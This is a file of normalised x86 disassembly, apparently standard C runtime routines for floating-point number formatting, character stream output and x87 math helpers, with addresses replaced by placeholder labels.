mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x88 ]
mov eax [ eax ]
mov al [ eax ]
mov [ ecx ] al
mov [ ecx ] 0x0
jmp r-xdata
mov [ ebp - 0xc ] 0x3fe
jmp r-xdata
and [ ebp - 0xc ] ecx
jmp r-xdata
mov edi ebx
jmp r-xdata
cmp [ ebp + 0x20 ] bl
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] bl
and [ ebp - 0x4 ] 0x0
mov ecx 0xf0000
push 0x30
pop eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x10 ] ecx
cmp [ edx ] 0x0
jbe r-xdata
mov eax [ edx + 0x4 ]
and eax 0xfffff
mov [ ebp - 0x10 ] eax
ja r-xdata
mov ecx esi
inc esi
mov [ ebp - 0x18 ] ecx
test edi edi
jne r-xdata
test ax ax
js r-xdata
mov eax [ edx ]
mov edx [ edx + 0x4 ]
and eax [ ebp - 0x4 ]
and edx ecx
mov ecx [ ebp - 0x8 ]
and edx 0xfffff
movsx ecx cx
call sub_448da0
push 0x30
pop ecx
add ax cx
movzx eax ax
cmp eax 0x39
jbe r-xdata
test edi edi
jle r-xdata
mov eax [ edx ]
mov edx [ edx + 0x4 ]
and eax [ ebp - 0x4 ]
and edx ecx
mov ecx [ ebp - 0x8 ]
and edx 0xfffff
movsx ecx cx
call sub_448da0
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ esi ] al
inc esi
mov eax [ ebp - 0x4 ]
shrd eax ecx 0x4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
shr ecx 0x4
sub eax 0x4
dec edi
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] eax
test ax ax
jns r-xdata
add eax ebx
mov eax [ ebp - 0x18 ]
cmp [ eax ] 0x0
jne r-xdata
push edi
push 0x30
pop eax
push eax
push esi
call sub_40dea0
add esp 0xc
add esi edi
push 0x30
lea eax [ esi - 0x1 ]
pop ebx
test edi edi
jle r-xdata
cmp [ ebp + 0x20 ] 0x0
mov cl 0x34
mov edx [ ebp + 0x8 ]
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edx ]
mov edx [ edx + 0x4 ]
call sub_448da0
mov ecx eax
xor ebx ebx
and ecx 0x7ff
sub ecx [ ebp - 0xc ]
sbb ebx ebx
js r-xdata
mov esi eax
mov [ eax ] bl
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi + 0x1 ] 0x2d
add esi 0x2
neg ecx
adc ebx 0x0
neg ebx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
mov ebx [ ebp - 0x1c ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp esi edi
jne r-xdata
mov eax 0x3e8
jg r-xdata
mov [ esi + 0x1 ] 0x2b
add esi 0x2
jmp r-xdata
test ecx ecx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
push 0x0
push 0xa
push ebx
push ecx
call sub_448c80
add al 0x30
mov [ ebp - 0x1c ] edx
mov [ esi ] al
inc esi
test ebx ebx
jl r-xdata
push 0x0
push eax
push ebx
push ecx
call sub_448c80
add al 0x30
mov [ ebp - 0x1c ] edx
mov [ esi ] al
inc esi
cmp esi edi
jne r-xdata
cmp ecx eax
jb r-xdata
mov edi esi
push 0x30
pop eax
mov [ esi ] al
test ebx ebx
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x30
pop eax
add cl al
xor edi edi
mov [ esi ] cl
mov [ esi + 0x1 ] 0x0
jg r-xdata
push 0x0
push 0x64
push ebx
push ecx
call sub_448c80
add al 0x30
mov [ ebp - 0x1c ] edx
mov [ esi ] al
inc esi
test ebx ebx
jl r-xdata
cmp ecx 0xa
jb r-xdata
jg r-xdata
cmp ecx 0x64
jb r-xdata
sub_434f8f
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
lea eax [ ebp - 0xc ]
push esi
mov esi [ ebp + 0x1c ]
push edi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
lea edi [ esi + 0x1 ]
push eax
mov eax [ ebp + 0x8 ]
push edi
push [ eax + 0x4 ]
push [ eax ]
call sub_441acf
or ecx 0xffffffff
add esp 0x18
cmp [ ebp + 0x10 ] ecx
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push edi
mov edi [ ebp + 0xc ]
push ecx
xor ecx ecx
cmp [ ebp - 0xc ] 0x2d
sete cl
xor eax eax
test esi esi
setg al
add ecx edi
add eax ecx
push eax
call sub_43f478
add esp 0x10
test eax eax
je r-xdata
mov ecx [ ebp + 0x10 ]
xor eax eax
cmp [ ebp - 0xc ] 0x2d
sete al
sub ecx eax
xor eax eax
test esi esi
setg al
sub ecx eax
push [ ebp + 0x28 ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push esi
push [ ebp + 0x10 ]
push edi
call sub_43502a
add esp 0x20
mov [ edi ] 0x0
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_43502a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
mov edi [ ebp + 0x10 ]
test edi edi
jle r-xdata
xor eax eax
mov eax edi
jmp r-xdata
push ebx
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x10 ]
call sub_41cbf0
mov dl [ ebp + 0x20 ]
mov ebx [ ebp + 0x8 ]
test dl dl
je r-xdata
call sub_430f56
push 0x22
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
add eax 0x9
cmp [ ebp + 0xc ] eax
ja r-xdata
mov eax [ ebp + 0x1c ]
mov esi ebx
cmp [ eax ] 0x2d
jne r-xdata
mov ecx [ ebp + 0x1c ]
xor eax eax
test edi edi
setg al
push eax
xor eax eax
cmp [ ecx ] 0x2d
sete al
add eax ebx
push eax
push [ ebp + 0xc ]
push ebx
call sub_435499
mov dl [ ebp + 0x20 ]
add esp 0x10
test edi edi
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
test dl dl
sete al
add eax edi
add esi eax
or eax 0xffffffff
cmp [ ebp + 0xc ] eax
je r-xdata
mov al [ esi + 0x1 ]
mov [ esi ] al
inc esi
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x88 ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
push r--data
push eax
push esi
call sub_42d2ce
add esp 0xc
pop ebx
test eax eax
jne r-xdata
mov eax ebx
sub eax esi
add eax [ ebp + 0xc ]
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_430e5d
int3
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x14 ] al
je r-xdata
mov edx [ ebp + 0x1c ]
mov eax [ edx + 0x8 ]
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
cmp [ ebp + 0x18 ] 0x2
jne r-xdata
mov edx [ edx + 0x4 ]
sub edx 0x1
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
push 0x64
pop edi
cmp edx edi
jl r-xdata
neg edx
mov [ esi + 0x1 ] 0x2d
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x350 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_416860
add esp 0xc
push 0xa
pop edi
cmp edx edi
jl r-xdata
mov eax edx
cdq
idiv edi
add [ esi + 0x2 ] al
pop edi
pop esi
mov esp ebp
pop ebp
retn
add [ esi + 0x4 ] dl
mov eax edx
cdq
idiv edi
add [ esi + 0x3 ] al
sub_435175
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
xor eax eax
push esi
push edi
push [ ebp + 0x18 ]
lea edi [ ebp - 0xc ]
push [ ebp + 0x14 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0xc ]
mov edi [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push edi
push [ eax + 0x4 ]
push [ eax ]
call sub_441acf
or ecx 0xffffffff
add esp 0x18
cmp [ ebp + 0x10 ] ecx
je r-xdata
mov esi [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
add eax edi
push eax
xor eax eax
cmp [ ebp - 0xc ] 0x2d
push ecx
sete al
add eax esi
push eax
call sub_43f478
add esp 0x10
test eax eax
je r-xdata
mov ecx [ ebp + 0x10 ]
xor eax eax
cmp [ ebp - 0xc ] 0x2d
sete al
sub ecx eax
push [ ebp + 0x20 ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
push edi
push [ ebp + 0x10 ]
push esi
call sub_435202
add esp 0x18
mov [ esi ] 0x0
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_435202
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push ebx
push esi
push edi
push [ ebp + 0x1c ]
call sub_41cbf0
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ edx + 0x4 ]
dec ecx
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ edx ] 0x2d
mov esi ebx
jne r-xdata
cmp ecx edi
jne r-xdata
mov eax [ edx + 0x4 ]
test eax eax
jg r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ edx ] 0x2d
sete al
add eax ecx
mov [ eax + ebx ] 0x30
add esi eax
push 0x1
push esi
push [ ebp + 0xc ]
push ebx
call sub_435499
add esp 0x10
mov [ esi ] 0x30
inc esi
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
push 0x1
push esi
push [ ebp + 0xc ]
push ebx
call sub_435499
mov eax [ ebp - 0xc ]
add esp 0x10
mov eax [ eax + 0x88 ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
inc esi
mov eax [ ebp + 0x14 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
jns r-xdata
test edi edi
jle r-xdata
xor eax eax
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x10 ]
and [ eax + 0x350 ] 0xfffffffd
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
mov edi ecx
neg edi
mov eax ecx
neg eax
cmp eax edi
jge r-xdata
push edi
push esi
push [ ebp + 0xc ]
push ebx
call sub_435499
push edi
push 0x30
push esi
call sub_40dea0
add esp 0x1c
sub_4352d9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x18 ]
xor eax eax
lea edi [ ebp - 0x10 ]
push [ ebp + 0x14 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0x10 ]
mov edi [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push edi
push [ eax + 0x4 ]
push [ eax ]
call sub_441acf
mov eax [ ebp - 0xc ]
xor ecx ecx
mov ebx [ ebp + 0xc ]
add esp 0x18
cmp [ ebp - 0x10 ] 0x2d
sete cl
dec eax
mov [ ebp - 0x4 ] eax
or eax 0xffffffff
lea esi [ ecx + ebx ]
cmp [ ebp + 0x10 ] eax
je r-xdata
lea ecx [ ebp - 0x10 ]
push ecx
push edi
push eax
push esi
call sub_43f478
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
sub eax ecx
mov eax [ ebp - 0xc ]
dec eax
cmp [ ebp - 0x4 ] eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ ebx ] 0x0
jmp r-xdata
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push 0x1
push eax
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push edi
push [ ebp + 0x10 ]
push ebx
call sub_43502a
add esp 0x20
cmp eax edi
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test cl cl
je r-xdata
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push 0x1
push eax
push edi
push [ ebp + 0x10 ]
push ebx
call sub_435202
add esp 0x18
jmp r-xdata
mov al [ esi ]
inc esi
test al al
jne r-xdata
mov [ esi - 0x2 ] al
sub_4353a1
mov edi edi
push ebp
mov ebp esp
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
push ebx
mov bl [ ebp + 0xc ]
movzx eax bl
add eax 0x4
cmp edx eax
jae r-xdata
test bl bl
je r-xdata
push 0xc
mov [ ecx ] 0x0
pop eax
mov eax r--data
mov [ ebp - 0x24 ] r--data
mov [ ebp - 0x44 ] eax
xor ebx ebx
cmp [ ebp + 0x18 ] bl
mov [ ebp - 0x40 ] eax
mov eax r--data
mov [ ebp - 0x3c ] eax
setne bl
mov [ ebp - 0x38 ] eax
dec ebx
mov eax r--data
mov [ ebp - 0x1c ] r--data
mov [ ebp - 0x2c ] eax
and ebx 0x2
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi r--data
mov [ ebp - 0x14 ] r--data
push edi
lea edi [ eax * 4 - 0x4 ]
mov [ ebp - 0x34 ] esi
lea eax [ edi + ebx ]
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] r--data
mov esi [ ebp + eax * 4 - 0x44 ]
lea eax [ esi + 0x1 ]
mov [ ebp - 0x48 ] eax
mov [ ecx ] 0x2d
inc ecx
dec edx
mov [ ecx ] 0x0
mov al [ esi ]
inc esi
test al al
jne r-xdata
sub esi [ ebp - 0x48 ]
cmp esi edx
sbb eax eax
inc edi
add eax edi
add eax ebx
push [ ebp + eax * 4 - 0x44 ]
push edx
push ecx
call sub_42d2ce
add esp 0xc
pop edi
pop esi
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_430e5d
int3
sub_435499
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x14 ]
test edx edx
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0x10 ]
mov ecx esi
push edi
lea edi [ ecx + 0x1 ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edi
lea eax [ ecx + 0x1 ]
push eax
lea eax [ esi + edx ]
push esi
push eax
call sub_416860
add esp 0xc
pop edi
pop esi
sub_4354d8
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
call sub_430f56
push 0x16
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
jmp r-xdata
call sub_430f56
push 0x16
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
pop ebx
cmp [ ebp + 0x18 ] 0x0
ja r-xdata
mov esi [ ebp + 0x1c ]
cmp esi 0x41
je r-xdata
mov [ ebp - 0x4 ] 0x1
cmp esi 0x45
je r-xdata
mov eax [ ebp + 0x24 ]
and eax 0x10
or eax 0x0
je r-xdata
push [ ebp + 0x8 ]
call sub_434c02
mov [ ebp - 0x8 ] eax
pop ecx
test eax eax
je r-xdata
cmp esi 0x46
je r-xdata
push 0x2
push 0x3
jmp r-xdata
push [ ebp - 0x4 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_434c6e
pop ecx
movzx eax al
push eax
push [ ebp - 0x8 ]
call sub_4353a1
add esp 0x14
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
cmp esi 0x47
jne r-xdata
sub esi 0x65
je r-xdata
pop eax
cmp esi 0x61
jg r-xdata
mov eax [ ebp + 0x24 ]
and eax 0x8
or eax 0x0
jne r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_434f8f
sub esi 0x1
je r-xdata
push [ ebp + 0x2c ]
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_434c8c
jmp r-xdata
sub esi 0x41
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_435175
add esp 0x1c
jmp r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_4352d9
jmp r-xdata
add esp 0x24
sub esi 0x4
jmp r-xdata
push [ ebp + 0x2c ]
je r-xdata
sub_435622
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
add [ eax + 0x8 ] 0xfffffffe
mov edx [ ebp + 0xc ]
cmp [ edx + 0x8 ] 0x0
jge r-xdata
mov ecx [ edx ]
mov ax [ ebp + 0x8 ]
mov [ ecx ] ax
add [ edx ] 0x2
pop ebp
retn
movzx eax [ ebp + 0x8 ]
push edx
push eax
call sub_432ea9
pop ecx
pop ecx
pop ebp
retn
sub_435654
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
mov edi [ ebp + 0xc ]
mov eax [ edi + 0xc ]
shr eax 0xc
test al 0x1
je r-xdata
push ebx
push esi
push edi
call sub_4321dd
mov ebx rw-data
pop ecx
cmp eax 0xffffffff
je r-xdata
push edi
push [ ebp + 0x8 ]
call sub_435622
pop ecx
pop ecx
jmp r-xdata
mov eax ebx
push edi
call sub_4321dd
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_40c38e
mov esp ebp
pop ebp
retn
push edi
push [ ebp + 0x8 ]
call sub_435622
pop ecx
pop ecx
cmp al 0x1
je r-xdata
push edi
call sub_4321dd
mov esi eax
push edi
sar esi 0x6
call sub_4321dd
and eax 0x3f
imul eax eax 0x30
pop ecx
pop ecx
add eax [ esi * 4 + rw-data ]
jmp r-xdata
push edi
call sub_4321dd
pop ecx
cmp eax 0xffffffff
je r-xdata
mov al [ eax + 0x29 ]
cmp al 0x2
je r-xdata
test [ ebx + 0x28 ] 0x80
je r-xdata
push edi
call sub_4321dd
pop ecx
cmp eax 0xfffffffe
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4342ec
add esp 0x10
test eax eax
jne r-xdata
push edi
call sub_4321dd
mov esi eax
push edi
sar esi 0x6
call sub_4321dd
and eax 0x3f
imul ebx eax 0x30
pop ecx
pop ecx
add ebx [ esi * 4 + rw-data ]
mov eax 0xffff
jmp r-xdata
xor esi esi
cmp [ ebp - 0x10 ] esi
jle r-xdata
pop esi
pop ebx
mov ax [ ebp + 0x8 ]
jmp r-xdata
movsx eax [ ebp + esi - 0xc ]
push edi
push eax
call sub_435830
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
inc esi
cmp esi [ ebp - 0x10 ]
jl r-xdata
sub_43579f
push 0xc
push r--data
call sub_40d270
xor eax eax
mov esi [ ebp + 0xc ]
test esi esi
setne al
test eax eax
jne r-xdata
mov eax 0xffff
mov [ ebp - 0x1c ] ax
push esi
call sub_417440
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push [ ebp + 0x8 ]
call sub_435654
pop ecx
pop ecx
mov di ax
mov [ ebp - 0x1c ] di
mov [ ebp - 0x4 ] 0xfffffffe
call sub_435812
mov ax di
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
mov eax 0xffff
jmp r-xdata
call sub_40d2b6
retn
sub_435830
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub [ edx + 0x8 ] 0x1
jns r-xdata
mov eax [ edx ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] cl
inc [ edx ]
movzx eax cl
pop ebp
retn
push edx
push [ ebp + 0x8 ]
call sub_432e9e
pop ecx
pop ecx
pop ebp
retn
sub_43587e
push 0xc
push r--data
call sub_40d270
xor eax eax
mov esi [ ebp + 0xc ]
test esi esi
setne al
test eax eax
jne r-xdata
and [ ebp - 0x1c ] 0x0
push esi
call sub_417440
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0xc ]
shr eax 0xc
test al 0x1
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
push esi
push [ ebp + 0x8 ]
call sub_435830
pop ecx
pop ecx
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43597a
mov eax edi
push esi
call sub_4321dd
pop ecx
mov edx eax
cmp edx 0xffffffff
je r-xdata
call sub_40d2b6
retn
mov ecx rw-data
mov eax ecx
cmp edx 0xfffffffe
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
push 0xfffffffe
lea ecx [ ebp - 0x10 ]
push ecx
push rw-data
call sub_4104e0
add esp 0xc
jmp r-xdata
cmp edx 0xffffffff
je r-xdata
mov ecx edx
sar ecx 0x6
and eax 0x3f
imul eax eax 0x30
add eax [ ecx * 4 + rw-data ]
mov ecx rw-data
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
test [ ecx + 0x2d ] 0x1
je r-xdata
cmp edx 0xfffffffe
je r-xdata
cmp [ eax + 0x29 ] 0x0
jne r-xdata
mov eax edx
sar eax 0x6
and edx 0x3f
imul ecx edx 0x30
add ecx [ eax * 4 + rw-data ]
sub_4359ad
mov edi edi
push ebp
mov ebp esp
mov edx [ rw-data ]
xor eax eax
mov ecx [ ebp + 0x8 ]
or edx 0x1
cmp [ rw-data ] edx
sete al
neg ecx
sbb ecx ecx
and ecx edx
mov [ rw-data ] ecx
pop ebp
retn
sub_4359d7
mov edi edi
push ebp
mov ebp esp
push ecx
call sub_430a7e
mov ecx [ eax + 0x4c ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
call sub_434ba8
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
add eax 0x4
mov esp ebp
pop ebp
retn
sub_435a1c
mov [ ebp - 0x90 ] 0xfe
fabs
fxch st1
fabs
fxch st1
fpatan
or cl cl
je r-xdata
or ch ch
je r-xdata
fldpi
fsubrp st1
retn
fchs
sub_435a3c
fabs
fld st0
fld st0
fld1
fsubrp st1
fxch st1
fld1
faddp st1
fmulp st1
ftst
fwait
fnstsw [ ebp - 0xa0 ]
fwait
test [ ebp - 0x9f ] 0x1
jne r-xdata
pop eax
jmp sub_4430a3
xor ch ch
fsqrt
retn
sub_435a75
fstp st0
or cl cl
je r-xdata
fstp st0
fldz
or ch ch
je r-xdata
fstp st0
fldpi
or ch ch
je r-xdata
retn
fchs
retn
fchs
sub_435ab0
push ebp
mov ebp esp
add esp 0xfffffd30
push ebx
fwait
fnstcw [ ebp - 0xa4 ]
fwait
push eax
push ecx
push edx
call sub_429e4e
cmp al 0x0
pop edx
pop ecx
pop eax
jne r-xdata
fxch st1
fst [ ebp - 0x86 ]
fxch st1
fst [ ebp - 0x7e ]
jmp r-xdata
call sub_442f57
or [ ebp - 0x2c8 ] 0x3
call sub_435b7f
pop ebx
leave
retn
sub_435af4
push ebp
mov ebp esp
add esp 0xfffffd30
push ebx
fwait
fnstcw [ ebp - 0xa4 ]
push eax
push ecx
push edx
call sub_429e4e
cmp al 0x0
pop edx
pop ecx
pop eax
jne r-xdata
fst [ ebp - 0x86 ]
jmp r-xdata
call sub_442ef0
or [ ebp - 0x2c8 ] 0x1
and [ ebp - 0x2c8 ] 0xfd
call sub_435b7f
pop ebx
leave
retn
sub_435b37
push ebp
mov ebp esp
add esp 0xfffffd30
push ebx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_435cf9
add esp 0x8
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_435cf9
add esp 0x8
fwait
fnstcw [ ebp - 0xa4 ]
or [ ebp - 0x2c8 ] 0x2
call sub_442f57
call sub_435b78
pop ebx
leave
retn
sub_435b7f
cmp [ rw-data ] 0x0
jne r-xdata
fldcw [ ebp - 0xa4 ]
fwait
retn
fst [ ebp - 0x2d0 ]
mov al [ ebp - 0x90 ]
or al al
je r-xdata
mov ax [ ebp - 0xa4 ]
and ax 0x20
jne r-xdata
cmp al 0xff
je r-xdata
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov ax [ ebp - 0x2ca ]
and ax 0x7ff0
cmp ax 0x7ff0
je r-xdata
cmp al 0xfe
je r-xdata
mov [ ebp - 0x8e ] 0x8
jmp r-xdata
mov [ ebp - 0x8e ] 0x3
fld [ r--data ]
fxch st1
fscale
fstp st1
fld st0
fabs
fcomp [ r--data ]
fwait
fnstsw ax
sahf
jbe r-xdata
jmp r-xdata
mov ax [ ebp - 0x2ca ]
and ax 0x7ff0
or ax ax
je r-xdata
or al al
je r-xdata
push esi
push edi
mov ebx [ ebp - 0x94 ]
inc ebx
mov [ ebp - 0x8a ] ebx
test [ ebp - 0x2c8 ] 0x1
jne r-xdata
fmul [ r--data ]
mov [ ebp - 0x8e ] 0x4
fld [ r--data ]
fxch st1
fscale
fstp st1
fld st0
fabs
fcomp [ r--data ]
fwait
fnstsw ax
sahf
jae r-xdata
cmp ax 0x7ff0
je r-xdata
movsx eax al
mov [ ebp - 0x8e ] eax
jmp r-xdata
fstp [ ebp - 0x76 ]
lea eax [ ebp - 0x8e ]
lea ebx [ ebp - 0xa4 ]
push ebx
push eax
mov ebx [ ebp - 0x94 ]
mov al [ ebx + 0xe ]
movsx eax al
push eax
call sub_4430f9
add esp 0xc
pop edi
pop esi
fld [ ebp - 0x76 ]
jmp r-xdata
cld
lea esi [ ebp + 0x8 ]
lea edi [ ebp - 0x86 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ ebx + 0xc ] 0x1
je r-xdata
fmul [ r--data ]
jmp r-xdata
jmp r-xdata
lea esi [ ebp + 0x10 ]
lea edi [ ebp - 0x7e ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub_435cc6
push ebp
mov ebp esp
add esp 0xfffffd30
push ebx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_435cf9
add esp 0x8
fwait
fnstcw [ ebp - 0xa4 ]
and [ ebp - 0x2c8 ] 0xfd
call sub_442ef0
call sub_435b78
pop ebx
leave
retn
sub_435cf9
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ax [ ebp + 0xe ]
mov bx ax
and ax 0x7ff0
cmp ax 0x7ff0
jne r-xdata
fld [ ebp + 0x8 ]
or bx 0x7fff
mov [ ebp - 0x2 ] bx
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
shld eax ebx 0xb
mov [ ebp - 0x6 ] eax
mov [ ebp - 0xa ] ebx
fld [ ebp - 0xa ]
jmp r-xdata
pop ebx
leave
retn
sub_435d40
cmp [ rw-data ] 0x0
je sub_435dcf
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne sub_435dcf
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
jmp sub_443258
sub_435d80
cmp [ rw-data ] 0x0
je r-xdata
sub esp 0xc
fst [ esp ]
call sub_443478
call sub_435dd8
add esp 0xc
retn
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
jmp sub_443240
sub_435dd8
push edx
fwait
fnstcw [ esp ]
je r-xdata
test eax 0xfffff
jne r-xdata
cmp [ esp ] 0x27f
je r-xdata
pop edx
retn
cmp [ esp + 0x8 ] 0x0
jne r-xdata
fcos
fwait
fnstsw ax
sahf
jpe r-xdata
fldcw [ r--data ]
fstp st0
fld [ r--data ]
mov eax 0x1
cmp [ rw-data ] 0x0
jne r-xdata
fld [ r--data ]
fxch st1
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ esp ] 0x27f
je r-xdata
mov edx 0x12
lea ecx [ r--data ]
call sub_443597
fprem1
fwait
fnstsw ax
sahf
jpe r-xdata
fstp st1
fcos
jmp r-xdata
mov edx 0x12
lea ecx [ r--data ]
jmp r-xdata
pop edx
retn
fldcw [ esp ]
mov ax [ esp ]
cmp ax 0x27f
je r-xdata
pop edx
retn
and ax 0x20
je r-xdata
fldcw [ esp ]
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov eax 0x8
call sub_443597
pop edx
retn
sub_435e70
cmp [ rw-data ] 0x0
je sub_435eff
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne sub_435eff
